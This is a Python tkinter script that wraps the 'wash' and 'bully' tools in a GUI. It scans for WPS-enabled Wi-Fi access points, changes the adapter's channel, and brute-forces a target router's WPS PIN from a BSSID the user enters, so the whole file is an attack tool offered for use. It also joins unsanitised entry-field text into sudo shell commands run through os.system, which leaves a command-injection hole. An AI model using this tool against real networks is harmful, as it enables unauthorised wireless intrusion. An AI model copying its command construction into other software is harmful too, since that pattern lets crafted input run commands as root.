from tkinter import *
import subprocess
import os

def Home():
	window.destroy() #close this tkinter GUI
	cmd = "python main.py"
	os.system(cmd)

def ChannelChange():
	cmd0 = "gnome-terminal --command='"'bash -c "'"sudo iwconfig "+devicelist.get()+" channel "
	cmd1 = str(e3.get()) #str() converting to string cmd1
	cmd2 = "; sleep 1"'"'"'"
	cmd3 = cmd0+cmd1+cmd2
	os.system(cmd3)

def Run():
	ChannelChange(); #a function call to changing channel
	cmd0 = "gnome-terminal --command='"'bash -c "'"sudo bully "+devicelist.get()+" -b "
	cmd1 = str(e1.get())
	cmd2 = " -p "
	cmd3 = str(e2.get())
	cmd4 = "; sleep 600"'"'"'"
	cmd5 = cmd0+cmd1+cmd2+cmd3+cmd4
	os.system(cmd5)

def Clear(): # a function to clear the Entry Widget Content
	e1.delete(0, END)
	e2.delete(0, END)
	e3.delete(0, END)

def Scan():
	cmd="gnome-terminal --command='"'bash -c "'"sudo wash -i "+devicelist.get()+"; sleep 60"'"'"'"
	os.system(cmd)

window = Tk()

window.title('Bully WPS Pin')
#window.geometry("350x90+10+20")

icon = PhotoImage(file='icon.png') # Use your PNG file here
window.iconphoto(True, icon)

##################################################
option = os.listdir('/sys/class/net/')

devicelist = StringVar()

for i in range(len(option)):
	if (option[i] == 'wlan0'):
		devicelist.set('wlan0')
		break
	else:
		devicelist.set("Select Adapter")
#devicelist.get()	#this is used to get dropdown menu seleted item's string
device = OptionMenu(window, devicelist, *option)
#device.config(width=42)
device.grid(row=0, column=1, pady=2)
##################################################

lbl1 = Label(window, text="Enter BSSID           ")
lbl1.grid(row=1,column=0)

lbl2 = Label(window, text="Enter WPS 7 Pin     ")
lbl2.grid(row=2,column=0)

lbl3 = Label(window, text="Enter WiFi Channel")
lbl3.grid(row=3,column=0)

e1 = Entry(window)
e1.grid(row=1, column=1)

e2 = Entry(window)
e2.grid(row=2, column=1)

e3 = Entry(window)
e3.grid(row=3, column=1)

quit = Button(window, text='Quit', command=window.quit) #window.quit close current window
quit.grid(row=2, column=2, ipadx=11, pady=4) #sticky=window.W,

home = Button(window, text='Home', command=Home)
home.grid(row=1, column=2, ipadx=5 ,pady=4) #sticky=window.W,

run = Button(window, text='Run', command=Run)
run.grid(row=4, column=1, ipadx=30, pady=4) #sticky=window.W,

Clear = Button(window,text="Clear", command=Clear) #button to clear the Entry Widget
Clear.grid(row=3, column=2, ipadx=8, pady=4) #sticky=window.W,

Scan = Button(window,text="Scan", command=Scan) #button to clear the Entry Widget
Scan.grid(row=4, column=2, ipadx=10, pady=4) #sticky=window.W,

window.mainloop()

